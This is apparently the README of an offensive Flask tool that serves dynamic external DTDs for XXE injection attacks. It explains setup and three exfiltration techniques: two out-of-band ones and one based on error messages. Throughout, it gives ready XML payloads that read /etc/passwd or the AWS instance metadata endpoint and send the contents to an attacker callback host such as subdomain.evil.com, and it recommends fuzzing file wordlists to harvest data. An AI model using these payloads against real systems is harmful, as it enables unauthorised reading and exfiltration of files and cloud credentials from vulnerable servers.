# Dynamic DTD
A python Flask app that generates dynamic DTDs for easy data exfiltration.

Usually when using external DTDs to perform data exfiltration with an XXE Injection vulnerability, you have to keep modifying the DTD, updating the external entity to point to new locations (files, internal web resources, etc.) every time you want to exfiltrate something new. This simple python Flask app allows you to create dynamic DTDs based on a single URL parameter, meaning that you can easily use it with your favorite fuzzer and file wordlist, sit back, and watch the data come in.

## Installation

Installation is simple. Just clone this repository, and install flask using pip:

```bash
pip3 install flask
```

## Configuration

There are generally two ways to use an external DTD to exfiltrate data: sending the data as part of a URL to a server you control, or triggering an error message in the application which includes the data.

If you are using the former, in `app.py`, on line 5, change the `app.config['callback']` assignment to the URL of either a Burp collaborator payload, or even just a web server you can view access logs on. Include the scheme, port number if it is non-standard, but leave off the trailing slash ( / ). An example can be seen below:

```
app.config['callback'] = 'https://subdomain.evil.com:8443'
```

Alternatively, you can pass the URL of the callback server as a URL parameter `callback` in payloads themselves (see Usage).

## Usage

Change to the directory of `app.py` and run the following command, specifying the port you want the server to run on, and the IP of the interface you wish to use.

```bash
flask run -p <port> -h <interface-ip>
```

Once the server is running, you can generate DTDs in three different ways, depending on the exfiltration technique you wish to use. Note that the payload required is different for each technique.

### Out-of-Band Exfiltration #1

For Out-of-Band exfiltration using a parameter entity, use the /oob.dtd path to generate dynamic DTDs. You can use the following payload in your XML documents, updating the `<server-ip>`, `<port>`, and `resource` parameter to appropriate values:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/oob.dtd?resource=file:///etc/passwd"> %xxe;]>
<root></root>
```

If the attack is successful, the contents of the /etc/passwd file (using the above example) should appear in the access logs of the `callback` server specified earlier. Note that for some parsers, only the first line of the file may get sent.

You can also set the `callback` server dynamically in the payload by using a `callback` parameter in the URL, setting it in the same way as in the script (i.e. including the scheme, port number if it is non-standard, and leaving off the trailing slash):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/oob.dtd?callback=https://subdomain.evil.com:8443&resource=file:///etc/passwd"> %xxe;]>
<root></root>
```

Once the `<server-ip>` and `<port>` are set in the payload, the value of the `resource` parameter can be fuzzed to try and find different files, or can be replaced by other URI schemes (e.g. http, https). For example, the following payload can be used to try and extract information from the AWS Instance Metadata API:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/oob.dtd?resource=http://169.254.169.254/latest/dynamic/instance-identity/document"> %xxe;]>
<root></root>
```

### Out-of-Band Exfiltration #2

As an alternative Out-of-Band exfiltration technique using a regular entity (&amp;oob;), use the /oob2.dtd path to generate dynamic DTDs. You can use the following payload in your XML documents, updating the `<server-ip>`, `<port>`, and `resource` parameter to appropriate values. Ensure the &amp;oob; entity is contained within the XML document itself.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root SYSTEM "http://<server-ip>:<port>/oob2.dtd?resource=file:///etc/passwd">
<root>&oob;</root>
```

If the attack is successful, the contents of the /etc/passwd file (using the above example) should appear in the access logs of the `callback` server specified earlier. Again, note that for some parsers, only the first line of the file may get sent.

As with the previous Out-of-Band technique, you can also set the `callback` server dynamically in the payload by using a `callback` parameter in the URL.

### Error Message Exfiltration

For error message exfiltration, use the /error.dtd path to generate dynamic DTDs. You can use the following payload in your XML documents, updating the `<server-ip>`, `<port>`, and `resource` parameter to appropriate values:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/error.dtd?resource=file:///etc/passwd"> %xxe;]>
```

If the attack is successful, the contents of the /etc/passwd file (using the above example) should appear within an error message in the application itself. Since this is an in-band technique, the `callback` variable is not used.

Once the `<server-ip>` and `<port>` are set in the payload, the value of the `resource` parameter can be fuzzed to try and find different files, or can be replaced by other URI schemes (e.g. http, https).
